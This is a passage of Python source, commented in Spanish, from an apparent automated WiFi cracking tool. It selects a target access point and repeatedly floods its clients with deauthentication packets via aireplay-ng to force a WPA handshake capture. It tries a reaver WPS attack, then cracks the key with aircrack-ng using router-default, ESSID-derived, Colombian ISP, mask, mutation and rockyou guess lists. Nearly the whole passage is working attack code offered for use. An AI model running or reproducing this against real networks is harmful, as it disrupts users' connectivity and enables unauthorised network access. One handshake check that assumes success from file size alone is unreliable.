                # Crear nueva interfaz
                success, _, _ = self.run_command(f"iw phy phy0 interface add {monitor_name} type monitor")
                if success:
                    self.monitor_interface = monitor_name
                    self.run_command(f"ip link set {monitor_name} up")
                    
                # Verificar que funciona
                success, output, _ = self.run_command(f"{iwconfig_path} {monitor_name} 2>/dev/null")
                if success and "Mode:Monitor" in output:
                    self.log(f"Modo monitor alternativo exitoso: {monitor_name}", "SUCCESS")
                    return True
            else:
                # Subir la interfaz
                self.run_command(f"ip link set {self.interface} up")
                time.sleep(1)
                
                # Verificar modo monitor
                success, output, _ = self.run_command(f"{iwconfig_path} {self.interface} 2>/dev/null")
                if success and "Mode:Monitor" in output:
                    self.monitor_interface = self.interface
                    self.log(f"Modo monitor alternativo exitoso: {self.interface}", "SUCCESS")
                    return True
            
            # Método 3: Usar iwconfig como último recurso
            self.log("Intentando con iwconfig como último recurso...", "INFO")
            success, _, _ = self.run_command(f"{iwconfig_path} {self.interface} mode monitor 2>/dev/null")
            if success:
                self.run_command(f"ip link set {self.interface} up")
                time.sleep(1)
                
                success, output, _ = self.run_command(f"{iwconfig_path} {self.interface} 2>/dev/null")
                if success and "Mode:Monitor" in output:
                    self.monitor_interface = self.interface
                    self.log(f"Modo monitor con iwconfig exitoso: {self.interface}", "SUCCESS")
                    return True
            
            self.log("Todos los métodos alternativos fallaron", "ERROR")
            return False
            
        except Exception as e:
            self.log(f"Error en método alternativo: {e}", "ERROR")
            return False

    def aggressive_handshake_capture(self, target):
        """Captura de handshake mejorada con detección de clientes y múltiples estrategias"""
        self.log(f"Iniciando captura mejorada: {target['essid']} (Canal {target['channel']})", "INFO")
        
        # PASO 1: Escanear clientes conectados primero
        clients = self.scan_connected_clients(target)
        if not clients:
            self.log(f"ATENCION: No se detectan clientes conectados a {target['essid']}", "WARNING")
            self.log("   Esto reducira significativamente las posibilidades de capturar handshake", "WARNING")
            self.log("   Procediendo con ataque broadcast...", "INFO")
        else:
            self.log(f"Detectados {len(clients)} clientes conectados - excelente!", "SUCCESS")
            for i, client in enumerate(clients[:3], 1):
                self.log(f"   Cliente {i}: {client}", "INFO")
        
        # Archivo de captura
        capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
        capture_file = self.handshake_dir / capture_filename
        cap_file = f"{capture_file}-01.cap"
        
        # PASO 2: Configurar captura optimizada
        self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
        time.sleep(1)  # Asegurar cambio de canal
        
        # Comando de captura con mejor buffer
        dump_cmd = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file} --write-interval 1"
        dump_process = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.log("Captura iniciada, monitoreando trafico...", "INFO")
        time.sleep(8)  # Tiempo mayor para capturar tráfico inicial
        
        # PASO 3: Estrategias de deauth mejoradas
        handshake_found = False
        
        # Estrategia 1: Ataques dirigidos a clientes específicos
        if clients:
            self.log("ESTRATEGIA 1: Ataques dirigidos a clientes especificos", "INFO")
            for client in clients[:3]:  # Máximo 3 clientes
                if not self.running:
                    break
                
                self.log(f"   Atacando cliente especifico: {client}", "INFO")
                
                # Deauth dirigido al cliente específico
                deauth_client_cmd = f"aireplay-ng -0 15 -a {target['bssid']} -c {client} {self.monitor_interface}"
                subprocess.run(deauth_client_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Esperar reconexión
                time.sleep(8)
                
                # Verificar handshake temprano
                if self.check_handshake_quick(cap_file):
                    handshake_found = True
                    break
        
        # Estrategia 2: Ataques broadcast progresivos si no hay handshake aun
        if not handshake_found:
            self.log("ESTRATEGIA 2: Ataques broadcast progresivos", "INFO")
            
            deauth_rounds = [
                (8, 5, "suave"),     # 8 paquetes, esperar 5s
                (15, 8, "moderado"), # 15 paquetes, esperar 8s  
                (25, 12, "agresivo"),# 25 paquetes, esperar 12s
                (40, 15, "intenso"), # 40 paquetes, esperar 15s
            ]
            
            for round_num, (packets, wait_time, intensity) in enumerate(deauth_rounds, 1):
                if not self.running or handshake_found:
                    break
                
                self.log(f"Ronda {round_num}: {packets} paquetes ({intensity})", "INFO")
                
                # Combinar ataques broadcast y dirigidos
                # Ataque broadcast
                deauth_broadcast = f"aireplay-ng -0 {packets} -a {target['bssid']} {self.monitor_interface}"
                subprocess.run(deauth_broadcast, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Si hay clientes, también atacarlos directamente
                if clients and round_num >= 2:
                    time.sleep(2)
                    for client in clients[:2]:
                        deauth_targeted = f"aireplay-ng -0 5 -a {target['bssid']} -c {client} {self.monitor_interface}"
                        subprocess.run(deauth_targeted, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(1)
                
                self.log(f"Esperando {wait_time}s para reconexiones...", "INFO")
                time.sleep(wait_time)
                
                # Verificación de handshake más robusta
                if self.verify_handshake_comprehensive(cap_file):
                    handshake_found = True
                    break
        
        # PASO 4: Captura extendida final si es necesario
        if not handshake_found:
            self.log("Captura extendida final de 30 segundos...", "INFO")
            
            # Un último ataque intenso
            final_deauth = f"aireplay-ng -0 50 -a {target['bssid']} {self.monitor_interface}"
            subprocess.run(final_deauth, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(30)
        
        # PASO 5: Detener captura y verificación final
        dump_process.terminate()
        time.sleep(3)
        
        return self.final_handshake_verification(cap_file, target)
    
    def scan_connected_clients(self, target):
        """Escanear clientes conectados al AP objetivo"""
        self.log(f"Escaneando clientes conectados a {target['essid']}...", "INFO")
        
        clients = []
        scan_file = "/tmp/client_scan"
        
        try:
            # Escanear durante 15 segundos para detectar clientes
            scan_cmd = f"timeout 15 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {scan_file} --write-interval 2"
            subprocess.run(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Buscar el archivo CSV generado
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    content = f.read()
                    # Buscar la sección de clientes (después de la línea Station MAC)
                    if "Station MAC" in content:
                        lines = content.split('\n')
                        in_clients_section = False
                        
                        for line in lines:
                            if "Station MAC" in line:
                                in_clients_section = True
                                continue
                            
                            if in_clients_section and line.strip():
                                # Línea de cliente: MAC, First time seen, Last time seen, Power, packets, BSSID, Probed ESSIDs
                                parts = line.split(',')
                                if len(parts) >= 6:
                                    client_mac = parts[0].strip()
                                    associated_bssid = parts[5].strip()
                                    
                                    # Verificar que el cliente está asociado con nuestro target
                                    if client_mac and associated_bssid == target['bssid']:
                                        clients.append(client_mac)
                
                # Limpiar archivos temporales
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    temp_file = f"{scan_file}{ext}"
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
            
            # Método alternativo: parsear desde airodump directo
            if not clients:
                self.log("Metodo alternativo: escaneo directo con timeout corto...", "INFO")
                scan_cmd2 = f"timeout 10 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']}"
                result = subprocess.run(scan_cmd2, shell=True, capture_output=True, text=True)
                
                # Buscar MACs en la salida que no sean el BSSID del AP
                import re
                mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
                found_macs = re.findall(mac_pattern, result.stdout)
                
                for mac_parts in found_macs:
                    full_mac = ''.join(mac_parts[0] + mac_parts[1])
                    if full_mac != target['bssid'] and full_mac not in clients:
                        clients.append(full_mac)
            
            return clients[:5]  # Máximo 5 clientes para evitar sobrecarga
            
        except Exception as e:
            self.log(f"Error escaneando clientes: {e}", "ERROR")
            return []
    
    def check_handshake_quick(self, cap_file):
        """Verificación rápida de handshake"""
        if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 2000:
            return False
        
        try:
            success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=5)
            has_handshake = success and ("1 handshake" in output or "handshakes" in output.lower())
            no_eapol_errors = "no EAPOL" not in output
            return has_handshake and no_eapol_errors
        except:
            return False
    
    def verify_handshake_comprehensive(self, cap_file):
        """Verificación comprehensiva de handshake con múltiples métodos"""
        if not os.path.exists(cap_file):
            return False
        
        file_size = os.path.getsize(cap_file)
        if file_size < 1000:
            return False
        
        self.log(f"Verificando handshake: {file_size} bytes", "INFO")
        
        # Método 1: aircrack-ng
        try:
            success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=10)
            if success:
                has_handshake = ("1 handshake" in output or "2 handshake" in output or "handshakes" in output.lower())
                no_eapol_error = "no EAPOL" not in output and "unable to process" not in output
                
                if has_handshake and no_eapol_error:
                    self.log("Handshake valido confirmado con aircrack-ng", "SUCCESS")
                    return True
                elif has_handshake:
                    self.log("Handshake detectado pero con problemas EAPOL", "WARNING")
        except:
            pass
        
        # Método 2: Contar paquetes EAPOL con tshark
        try:
            eapol_cmd = f'tshark -r "{cap_file}" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l'
            success, output, _ = self.run_command(eapol_cmd, timeout=8)
            if success and output.strip().isdigit():
                eapol_count = int(output.strip())
                self.log(f"Paquetes EAPOL detectados: {eapol_count}", "INFO")
                
                if eapol_count >= 4:
                    self.log("Suficientes paquetes EAPOL para handshake", "SUCCESS")
                    return True
                elif eapol_count >= 2:
                    self.log("Paquetes EAPOL parciales detectados", "WARNING")
        except:
            pass
        
        return False
    
    def final_handshake_verification(self, cap_file, target):
        """Verificación final comprehensiva del handshake capturado"""
        if not os.path.exists(cap_file):
            self.log("No se genero archivo de captura", "ERROR")
            return None
        
        file_size = os.path.getsize(cap_file)
        self.log(f"Archivo final: {file_size} bytes", "INFO")
        
        if file_size < 1000:
            self.log("Archivo demasiado pequeno para contener handshake", "ERROR")
            return None
        
        # Verificación con aircrack-ng
        success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=15)
        
        if success:
            self.log("Analisis de aircrack-ng:", "INFO")
            
            # Buscar indicaciones de handshake
            handshake_indicators = [
                "1 handshake", "2 handshake", "3 handshake", "4 handshake",
                "handshakes", "EAPOL"
            ]
            
            error_indicators = [
                "no EAPOL data", "unable to process", "No networks found"
            ]
            
            has_handshake = any(indicator in output.lower() for indicator in handshake_indicators)
            has_errors = any(error in output for error in error_indicators)
            
            if has_handshake and not has_errors:
                self.log(f"EXITO: Handshake valido capturado para {target['essid']}", "SUCCESS")
                self.log(f"Archivo: {cap_file}", "SUCCESS")
                return cap_file
            elif has_handshake and has_errors:
                self.log("Handshake detectado pero con problemas de formato", "WARNING")
                # Intentar reparar o convertir archivo
                return self.attempt_handshake_repair(cap_file, target)
            else:
                self.log("No se detecto handshake valido en la captura", "ERROR")
        
        # Verificacion adicional con metodos alternativos
        return self.alternative_handshake_verification(cap_file, target)
    
    def attempt_handshake_repair(self, cap_file, target):
        """Intentar reparar o convertir handshake problematico"""
        self.log("Intentando reparar handshake problematico...", "INFO")
        
        # Intentar con tshark para verificar contenido real
        try:
            eapol_check = f'tshark -r "{cap_file}" -Y "eapol" -c 10 2>/dev/null'
            success, output, _ = self.run_command(eapol_check, timeout=10)
            
            if success and output.strip():
                self.log("Encontrados paquetes EAPOL con tshark", "SUCCESS")
                return cap_file  # El archivo es utilizable
            else:
                self.log("No se encontraron paquetes EAPOL validos", "ERROR")
        except:
            pass
        
        return None
    
    def alternative_handshake_verification(self, cap_file, target):
        """Metodos alternativos para verificar handshake"""
        self.log("Verificacion alternativa del handshake...", "INFO")
        
        # Metodo 1: Analisis de tamano y contenido basico
        file_size = os.path.getsize(cap_file)
        if file_size > 5000:  # Archivos > 5KB generalmente tienen contenido util
            self.log(f"Archivo de tamano razonable ({file_size} bytes) - probablemente valido", "INFO")
            
            # Metodo 2: Verificar que no esta corrupto
            try:
                # Intentar leer con tcpdump para verificar integridad
                tcpdump_check = f'tcpdump -r "{cap_file}" -c 1 2>/dev/null'
                success, _, _ = self.run_command(tcpdump_check, timeout=5)
                
                if success:
                    self.log("Archivo integro - asumiendo handshake capturado", "INFO")
                    return cap_file
            except:
                pass
        
        self.log("No se pudo verificar handshake valido", "ERROR")
        return None

    def crack_handshake(self, target, handshake_file):
        """Sistema inteligente de cracking con múltiples métodos avanzados"""
        self.log(f"🔐 Iniciando análisis inteligente multimodal: {target['essid']}", "INFO")
        
        # Verificar archivo
        if not os.path.exists(handshake_file) or os.path.getsize(handshake_file) < 1000:
            self.log("❌ Archivo de handshake inválido", "ERROR")
            return None
        
        # FASE 1: Análisis inteligente de información
        self.log("🧠 FASE 1: Análisis inteligente rápido...", "INFO")
        password = self.intelligent_analysis(target)
        if password:
            return password
        
        # FASE 2: Ataques de fuerza bruta inteligente
        self.log("🎯 FASE 2: Ataques de fuerza bruta dirigidos...", "INFO")
        password = self.advanced_bruteforce_attacks(target, handshake_file)
        if password:
            return password
        
        # FASE 3: Análisis de patrones de teclado
        self.log("⌨️ FASE 3: Patrones de teclado y secuencias...", "INFO")
        password = self.keyboard_pattern_attack(target, handshake_file)
        if password:
            return password
        
        # FASE 4: Ataques por máscara basados en ESSID
        self.log("🎭 FASE 4: Ataques por máscara inteligente...", "INFO")
        password = self.mask_attack_essid_based(target, handshake_file)
        if password:
            return password
        
        # FASE 5: Mutaciones inteligentes
        self.log("🧬 FASE 5: Mutaciones y variaciones inteligentes...", "INFO")
        password = self.intelligent_mutations(target, handshake_file)
        if password:
            return password
        
        # FASE 6: Solo como último recurso, wordlists
        self.log("📚 FASE 6: Método tradicional con wordlists (último recurso)...", "INFO")
        return self.wordlist_attack(target, handshake_file)
    
    def intelligent_analysis(self, target):
        """Análisis inteligente para obtener información sin wordlists"""
        essid = target['essid']
        bssid = target['bssid']
        
        # 1. Verificar si WPS está habilitado (más fácil)
        password = self.try_wps_attack(target)
        if password:
            return password
        
        # 2. Análisis del fabricante por BSSID
        password = self.analyze_router_defaults(target)
        if password:
            return password
        
        # 3. Análisis de patrones comunes por ESSID
        password = self.analyze_essid_patterns(target)
        if password:
            return password
        
        # 4. Búsqueda en bases de datos de contraseñas por defecto
        password = self.check_default_passwords(target)
        if password:
            return password
        
        self.log("🤖 Análisis inteligente completado - sin resultados", "WARNING")
        return None
    
    def try_wps_attack(self, target):
        """Intentar ataque WPS si está disponible"""
        bssid = target['bssid']
        
        self.log("📡 Verificando si WPS está habilitado...", "INFO")
        
        # Verificar WPS con wash
        wash_cmd = f"timeout 10 wash -i {self.monitor_interface} | grep {bssid}"
        success, output, _ = self.run_command(wash_cmd)
        
        if success and bssid in output and "Yes" in output:
            self.log("🎯 ¡WPS detectado! Intentando ataque...", "SUCCESS")
            
            # Intentar reaver (más rápido que bully)
            reaver_cmd = f"timeout 60 reaver -i {self.monitor_interface} -b {bssid} -vv -S"
            success, output, _ = self.run_command(reaver_cmd)
            
            if success and "WPA PSK" in output:
                # Extraer contraseña WPS
                for line in output.split('\n'):
                    if "WPA PSK" in line:
                        password = line.split("'")[1] if "'" in line else line.split()[-1]
                        self.log(f"🎉 ¡CONTRASEÑA WPS ENCONTRADA! → {password}", "SUCCESS")
                        return password
        
        return None
    
    def analyze_router_defaults(self, target):
        """Analizar contraseñas por defecto según el fabricante"""
        bssid = target['bssid']
        essid = target['essid']
        
        self.log(f"🔍 Analizando fabricante por BSSID: {bssid}", "INFO")
        
        # Base de datos de OUI (primeros 3 octetos) y sus contraseñas típicas
        oui_database = {
            # Movistar/Telefonica
            '00:1F:A4': ['movistar', essid, essid[-8:] if len(essid) >= 8 else essid + '1234'],
            '00:1B:20': ['movistar', essid, essid + '2024'],
            
            # Claro
            '00:25:68': ['claro123', essid, 'admin123'],
            '00:1E:2A': ['claro123', essid + '123'],
            
            # ETB (Colombia)
            '24:2F:D0': ['etb12345', essid, essid + 'etb'],
            '50:1B:32': ['etb12345', essid + '123'],
            
            # TP-Link
            '18:D6:C7': ['admin123', essid, essid + '123'],
            '50:C7:BF': ['admin', 'tplink123'],
            
            # D-Link
            '00:26:5A': ['admin', essid, 'dlink123'],
            '00:1B:11': ['admin', essid + '123'],
            
            # Linksys
            '00:25:9C': ['admin', essid, 'linksys123'],
            '68:7F:74': ['admin', essid + '123'],
            
            # Huawei
            '00:25:9E': ['admin', essid, essid[-8:] if len(essid) >= 8 else 'huawei123'],
            
            # Netgear
            '00:26:F2': ['password', essid, 'netgear123'],
            '84:1B:5E': ['password', essid + '123'],
        }
        
        # Extraer OUI (primeros 6 caracteres)
        oui = bssid[:8].upper()
        
        if oui in oui_database:
            self.log(f"📋 Fabricante detectado para OUI {oui}", "SUCCESS")
            passwords_to_try = oui_database[oui]
            
            return self.quick_password_test(target, passwords_to_try, "fabricante")
        
        return None
    
    def analyze_essid_patterns(self, target):
        """Análisis de patrones comunes en nombres de red"""
        essid = target['essid'].lower()
        
        self.log(f"🔤 Analizando patrones en ESSID: {essid}", "INFO")
        
        patterns = []
        
        # Patrones familiares colombianos
        if any(word in essid for word in ['familia', 'flia', 'casa', 'hogar']):
            patterns.extend([
                essid.replace(' ', '') + '123',
                essid.replace(' ', '') + '2024',
                'familia123', 'casa1234'
            ])
        
        # Patrones de operadores
        if 'claro' in essid:
            patterns.extend(['claro123', essid + '123', 'admin123'])
        if 'movistar' in essid:
            patterns.extend(['movistar', essid, essid[-8:] if len(essid) >= 8 else essid + '123'])
        if 'etb' in essid:
            patterns.extend(['etb12345', essid.replace('_etb', ''), 'fibra123'])
        
        # Patrones de nombres personales
        if any(char.isalpha() for char in essid) and len(essid) <= 15:
            # Probablemente un nombre
            patterns.extend([
                essid + '123', essid + '1234', essid + '12345',
                essid + '2024', essid + '01', '123' + essid
            ])
        
        if patterns:
            return self.quick_password_test(target, patterns, "patrones ESSID")
        
        return None
    
    def check_default_passwords(self, target):
        """Verificar contraseñas por defecto ultra comunes"""
        self.log("🔑 Probando contraseñas por defecto comunes...", "INFO")
        
        # Lista de contraseñas por defecto más comunes en Colombia
        default_passwords = [
            '12345678', '123456789', 'admin123', 'password',
            'movistar', 'claro123', 'etb12345', 'telmex123',
            'familia123', 'casa1234', 'internet', 'wifi1234',
            '87654321', '11111111', '00000000', 'qwerty123',
            'administrador', 'password123', 'admin1234'
        ]
        
        return self.quick_password_test(target, default_passwords, "contraseñas por defecto")
    
    def quick_password_test(self, target, passwords, method_name):
        """Probar rápidamente una lista pequeña de contraseñas"""
        self.log(f"⚡ Probando {len(passwords)} contraseñas de {method_name}...", "INFO")
        
        # Crear wordlist temporal
        temp_wordlist = f"/tmp/quick_{method_name.replace(' ', '_')}.txt"
        try:
            with open(temp_wordlist, 'w') as f:
                for pwd in passwords:
                    if pwd and len(pwd) >= 8:  # Solo contraseñas válidas WPA
                        f.write(pwd + '\n')
        except:
            return None
        
        # Probar con aircrack-ng (timeout corto)
        crack_cmd = f"aircrack-ng -w {temp_wordlist} -b {target['bssid']} handshakes/{target['essid']}_{target['bssid'].replace(':', '')}-01.cap"
        success, output, _ = self.run_command(crack_cmd, timeout=30)
        
        if success and "KEY FOUND" in output:
            key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
            match = re.search(key_pattern, output)
            if match:
                password = match.group(1).strip()
                self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA POR {method_name.upper()}! → {password}", "SUCCESS")
                return password
        
        # Limpiar archivo temporal
        try:
            os.remove(temp_wordlist)
        except:
            pass
        
        return None
    
    def wordlist_attack(self, target, handshake_file):
        """Método tradicional con wordlists (fallback)"""
        self.log("📚 Iniciando ataque tradicional con wordlists...", "INFO")
        
        # Crear wordlist personalizada mejorada
        custom_wordlist = self.create_simple_wordlist(target)
        
        # Lista de wordlists por orden de efectividad
        wordlists_to_try = [custom_wordlist]
        
        # Agregar wordlists del sistema si existen
        system_wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/fasttrack.txt",
            str(self.wordlist_dir / "common_passwords.txt")
        ]
        
        for wl in system_wordlists:
            if os.path.exists(wl):
                wordlists_to_try.append(wl)
        
        # Probar cada wordlist
        for wl_path in wordlists_to_try:
            if not os.path.exists(wl_path):
                continue
            
            wl_name = os.path.basename(wl_path)
            self.log(f"🔍 Probando wordlist: {wl_name}", "INFO")
            
            # Comando aircrack-ng
            crack_cmd = f"aircrack-ng -w {wl_path} -b {target['bssid']} {handshake_file}"
            success, output, _ = self.run_command(crack_cmd, timeout=300)
            
            if success and "KEY FOUND" in output:
                # Extraer la contraseña
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA CON WORDLIST! → {password}", "SUCCESS")
                    return password
            
            self.log(f"❌ Sin éxito con {wl_name}", "INFO")
        
        return None
    
    def create_simple_wordlist(self, target):
        """Crear wordlist personalizada simple y efectiva"""
        essid = target['essid']
        wordlist_file = f"/tmp/simple_{essid.replace(' ', '_')}.txt"
        passwords = set()
        
        # Limpiar ESSID
        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
        base_words = [essid, essid_clean, essid_clean.lower(), essid_clean.upper()]
        
        # Números comunes
        numbers = ['123', '1234', '12345', '123456', '12345678', '2024', '2023', '2022']
        
        # Sufijos comunes
        suffixes = ['', 'wifi', 'casa', 'home', 'admin']
        
        # Generar combinaciones
        for base in base_words:
            if len(base) < 2:
                continue
            for num in numbers:
                for suffix in suffixes:
                    combos = [base + num + suffix, base + suffix + num]
                    for combo in combos:
                        if len(combo) >= 8 and len(combo) <= 63:
                            passwords.add(combo)
        
        # Patrones comunes
        common = ['12345678', 'password', 'admin123', essid_clean + '123']
        passwords.update(p for p in common if len(p) >= 8)
        
        # Escribir archivo
        try:
            with open(wordlist_file, 'w') as f:
                for pwd in sorted(passwords, key=len):
                    f.write(pwd + '\n')
        except:
            pass
        
        return wordlist_file

    def advanced_bruteforce_attacks(self, target, handshake_file):
        """Ataques de fuerza bruta inteligente y dirigidos"""
        essid = target['essid']
        
        # 1. Ataque numérico puro (8-12 dígitos)
        self.log("🔢 Probando patrones numéricos comunes...", "INFO")
        numeric_patterns = [
            # Fechas de nacimiento comunes
            "19801980", "19901990", "20001980", "19951995",
            "19751975", "19851985", "20002000", "19701970",
            # Números de teléfono
            "30012345", "31012345", "32012345", "35012345",
            "60012345", "12345678", "87654321", "11111111",
            # Códigos postales comunes (Colombia)
            "11001234", "05001234", "76001234", "13001234",
            # Patrones simples
            "12344321", "12348765", "98765432", "13579246"
        ]
        
        password = self.quick_password_test_advanced(target, numeric_patterns, "numérico")
        if password:
            return password
        
        # 2. Generación numérica dinámica basada en ESSID
        if len(essid) >= 4:
            essid_numbers = []
            # Extraer números del ESSID
            import re
            numbers_in_essid = re.findall(r'\d+', essid)
            for num in numbers_in_essid:
                if len(num) >= 4:
                    essid_numbers.extend([
                        num * 2,  # Duplicar
                        num + num[::-1],  # Número + reverso
                        num + "1234", num + "2024"
                    ])
            
            if essid_numbers:
                password = self.quick_password_test_advanced(target, essid_numbers, "ESSID numérico")
                if password:
                    return password
        
        # 3. Fuerza bruta incremental (últimos 4 dígitos del año)
        self.log("📅 Probando variaciones con años recientes...", "INFO")
        year_patterns = []
        base_name = essid.replace(' ', '').replace('-', '')[:4]
        if len(base_name) >= 3:
            for year in range(2020, 2025):
                year_patterns.extend([
                    f"{base_name}{year}",
                    f"{year}{base_name}",
                    f"{base_name}{year}123"
                ])
        
        password = self.quick_password_test_advanced(target, year_patterns, "variaciones año")
        if password:
            return password
        
        return None
    
    def keyboard_pattern_attack(self, target, handshake_file):
        """Ataques basados en patrones de teclado comunes"""
        
        # Patrones de teclado QWERTY
        keyboard_patterns = [
            # Filas horizontales
            "qwertyui", "asdfghjk", "zxcvbnma", 
            "12345678", "87654321", "qwerty123",
            # Patrones diagonales
            "qazwsxed", "plokijuh", "mnbvcxza",
            # Patrones en L
            "qwerasdf", "yuiophjk", "123qweas",
            # Patrones comunes latinos
            "qwertyuiop", "asdfghjkl", "password123",
            "admin123", "usuario123", "internet123"
        ]
        
        password = self.quick_password_test_advanced(target, keyboard_patterns, "patrones teclado")
        if password:
            return password
        
        # Patrones específicos por región (Colombia/Latinoamérica)
        latin_patterns = [
            "colombia123", "bogota123", "medellin123",
            "internet2024", "claro123456", "movistar123",
            "tigo123456", "virgin123", "une123456",
            "familia123", "casa123456", "hogar12345"
        ]
        
        password = self.quick_password_test_advanced(target, latin_patterns, "patrones latinos")
        if password:
            return password
        
        return None
    
    def mask_attack_essid_based(self, target, handshake_file):
        """Ataques por máscara basados en el ESSID"""
        essid = target['essid']
        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
        
        self.log(f"🎭 Generando máscaras para: {essid}", "INFO")
        
        # Generar patrones basados en el ESSID
        mask_patterns = []
        
        if len(essid_clean) >= 3:
            base = essid_clean[:6] if len(essid_clean) >= 6 else essid_clean
            
            # Patrón: ESSID + números
            for i in range(10, 100):
                mask_patterns.extend([
                    f"{base}{i}",
                    f"{base}{i:02d}",
                    f"{base}20{i:02d}" if i <= 24 else f"{base}19{i}"
                ])
            
            # Patrón: ESSID + símbolos comunes
            for symbol in ['123', '456', '789', '000', '111']:
                mask_patterns.extend([
                    f"{base}{symbol}",
                    f"{base}_{symbol}",
                    f"{base}-{symbol}"
                ])
        
        # Limitar a patrones válidos (8-63 caracteres)
        valid_patterns = [p for p in mask_patterns if 8 <= len(p) <= 63]
        
        if valid_patterns:
            # Probar en lotes para eficiencia
            for i in range(0, len(valid_patterns), 50):
                batch = valid_patterns[i:i+50]
                password = self.quick_password_test_advanced(target, batch, f"máscara lote {i//50+1}")
                if password:
                    return password
        
        return None
    
    def intelligent_mutations(self, target, handshake_file):
        """Mutaciones inteligentes basadas en información del objetivo"""
        essid = target['essid']
        bssid = target['bssid']
        
        self.log("🧬 Aplicando mutaciones inteligentes...", "INFO")
        
        mutations = set()
        base_words = [essid, essid.lower(), essid.upper()]
        
        # Eliminar espacios y caracteres especiales
        for word in base_words:
            clean_word = word.replace(' ', '').replace('-', '').replace('_', '')
            if len(clean_word) >= 3:
                mutations.add(clean_word)
        
        # Agregar mutaciones comunes
        final_mutations = set()
        for base in mutations:
            if len(base) >= 3:
                # Agregar números al final
                for num in ['1', '12', '123', '1234', '12345', '123456', '2024', '2023']:
                    candidate = base + num
                    if 8 <= len(candidate) <= 63:
                        final_mutations.add(candidate)
                
                # Agregar números al principio
                for num in ['1', '123', '2024']:
                    candidate = num + base
                    if 8 <= len(candidate) <= 63:
                        final_mutations.add(candidate)
                
                # Duplicar palabra
                doubled = base + base
                if 8 <= len(doubled) <= 63:
                    final_mutations.add(doubled)
                
                # Reverso
                reversed_word = base[::-1]
                if len(reversed_word) >= 4:
                    final_mutations.add(base + reversed_word)
                
                # Capitalización
                if len(base) >= 4:
                    final_mutations.add(base.capitalize() + '123')
                    final_mutations.add(base.upper() + '2024')
        
        # Agregar variaciones basadas en BSSID
        import re
        bssid_numbers = ''.join(re.findall(r'\d', bssid))
        if len(bssid_numbers) >= 4:
            for base in list(final_mutations)[:10]:  # Solo las primeras 10
                final_mutations.add(base + bssid_numbers[-4:])
        
        # Convertir a lista y probar
        mutation_list = list(final_mutations)
        if mutation_list:
            # Ordenar por probabilidad (longitudes más comunes primero)
            mutation_list.sort(key=lambda x: abs(len(x) - 10))
            
            # Probar en lotes
            for i in range(0, len(mutation_list), 100):
                batch = mutation_list[i:i+100]
                password = self.quick_password_test_advanced(target, batch, f"mutaciones {i//100+1}")
                if password:
                    return password
        
        return None
    
    def quick_password_test_advanced(self, target, passwords, method_name):
        """Prueba rápida de lista de contraseñas contra el handshake (versión avanzada)"""
        if not passwords:
            return None
            
        # Crear archivo temporal con contraseñas
        temp_file = f"/tmp/test_{method_name.replace(' ', '_')}_{int(time.time())}.txt"
        
        try:
            with open(temp_file, 'w') as f:
                for pwd in passwords:
                    if isinstance(pwd, str) and len(pwd) >= 8:
                        f.write(pwd + '\n')
            
            self.log(f"🔍 Probando {len(passwords)} contraseñas con método: {method_name}", "INFO")
            
            # Buscar archivo de handshake en múltiples ubicaciones
            handshake_files = [
                f"handshakes/{target['essid']}_{target['bssid'].replace(':', '')}-01.cap",
                f"/tmp/{target['essid']}-01.cap",
                f"{target['essid']}_{target['bssid'].replace(':', '')}-01.cap"
            ]
            
            handshake_file = None
            for hf in handshake_files:
                if os.path.exists(hf):
                    handshake_file = hf
                    break
            
            if not handshake_file:
                self.log("No se encontró archivo de handshake", "WARNING")
                return None
            
            # Ejecutar aircrack-ng con timeout más generoso
            crack_cmd = f"aircrack-ng {handshake_file} -w {temp_file}"
            success, output, _ = self.run_command(crack_cmd, timeout=120)
            
            if success and "KEY FOUND" in output:
                # Extraer contraseña
                import re
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA con {method_name}! → {password}", "SUCCESS")
                    return password
            
        except Exception as e:
            self.log(f"Error en {method_name}: {e}", "WARNING")
        finally:
            # Limpiar archivo temporal
            try:
                os.remove(temp_file)
            except:
                pass
        
        return None

    def _save_original_state(self):
        """Guardar estado original del sistema"""
        try:
            success, output, _ = self.run_command("systemctl is-active NetworkManager", capture_output=True)
            self.original_nm_state = "active" if success and "active" in output else "inactive"
            
            success, output, _ = self.run_command("iw dev 2>/dev/null || iwconfig 2>/dev/null || ip link show", capture_output=True)
            if success:
                self.original_interfaces = output
            else:
                self.original_interfaces = ""
        except Exception as e:
            self.log(f"Error guardando estado original: {e}", "WARNING")

    def cleanup(self):
